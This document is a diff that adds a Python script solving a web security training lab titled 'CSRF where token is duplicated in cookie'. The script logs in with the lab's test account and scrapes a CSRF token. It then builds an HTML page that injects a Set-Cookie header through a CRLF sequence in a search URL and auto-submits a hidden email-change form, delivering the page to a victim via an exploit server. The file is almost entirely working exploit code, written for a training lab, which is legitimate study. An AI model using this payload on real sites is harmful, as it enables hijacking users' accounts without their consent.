@@ -1,0 +1,83 @@
+import requests
+import re
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+LAB_NAME = "CSRF where token is duplicated in cookie"
+
+
+def post_data(url, data, cookies=None, allow_redirects=True):
+    try:
+        return requests.post(url, data=data, cookies=cookies, allow_redirects=allow_redirects, verify=False)
+    except Exception as e:
+        print(f"[!] Failed to post data: {e}")
+        return None
+
+
+def run(url, payload, proxies=None):
+    session = requests.Session()
+    session.proxies = proxies or {}
+    session.verify = False
+
+    try:
+        # Step 1: Login as wiener
+        r = session.get(url.rstrip('/') + "/login")
+        csrf_token = re.search(r'name="csrf" value="(.+?)"', r.text).group(1)
+        session_cookie = r.cookies.get("session")
+
+        login_data = {
+            "username": "wiener",
+            "password": "peter",
+            "csrf": csrf_token
+        }
+        cookies = {
+            "session": session_cookie
+        }
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+
+        r = session.post(url.rstrip('/') + "/login",
+                         data=login_data, cookies=cookies, headers=headers)
+
+        # Step 2: Fetch /my-account to get new CSRF token
+        r = session.get(url.rstrip('/') + "/my-account")
+        csrf_token = re.search(r'name="csrf" value="(.+?)"', r.text).group(1)
+
+        # Step 3: Ask for exploit server URL
+        exploit_server = input(
+            "[?] Enter the exploit server URL: ").strip().rstrip('/')
+
+        # Step 4: Build and deliver exploit
+        new_email = "mystic_mido@mystic_mido.com"
+        payload = f"""<html>
+    <body>
+    <form action="{url.rstrip('/')}/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="{new_email}" />
+        <input type="hidden" name="csrf" value="{csrf_token}" />
+        <input type="submit" value="Submit" />
+    </form>
+    <img src="{url.rstrip('/')}/?search=boo%0d%0aSet-Cookie: csrf={csrf_token}; SameSite=None" onerror="document.forms[0].submit()">
+    </body>
+</html>"""
+
+        exploit_data = {
+            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
+            "responseBody": payload,
+            "formAction": "DELIVER_TO_VICTIM",
+            "urlIsHttps": "on",
+            "responseFile": "/exploit"
+        }
+
+        res = post_data(exploit_server + "/", exploit_data)
+        if res and res.status_code == 200:
+            print("[+] Exploit delivered successfully!")
+            return True
+        else:
+            print("[-] Exploit delivery failed.")
+            return False
+
+    except Exception as e:
+        print(f"[!] Error during exploitation: {e}")
+        return False
